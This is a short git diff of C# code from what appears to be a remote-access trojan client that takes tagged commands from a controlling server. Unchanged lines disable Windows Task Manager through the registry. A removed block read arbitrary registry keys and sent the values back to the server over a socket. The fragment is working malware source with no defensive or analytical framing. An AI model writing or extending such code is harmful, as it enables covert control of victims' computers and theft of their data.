@@ -44,14 +44,6 @@ namespace Client.Client
                 WindowsHelper.WriteRegistryKey(szTaskMgrRegPath, RegistryValueKind.DWord, "DisableTaskMgr", value, true);
             }
             
-            if (szCMD.StartsWith("<GET-REGKEY>"))
-            {
-                szCMD = szCMD.Replace("<GET-REGKEY>", "");
-                string[] split = szCMD.Split("<SPLIT>");
-                string returnString = WindowsHelper.ReadRegistryKey(split[0], split[1]);
-                Main.socketClient.GetServerSocket().Send(Encoding.ASCII.GetBytes("<GET-REGKEY>" + returnString));
-            }
-            
             if (szCMD.StartsWith("<SHUTDOWN-CLIENT>"))
             {
                 SocketClient.bShouldRun = false;
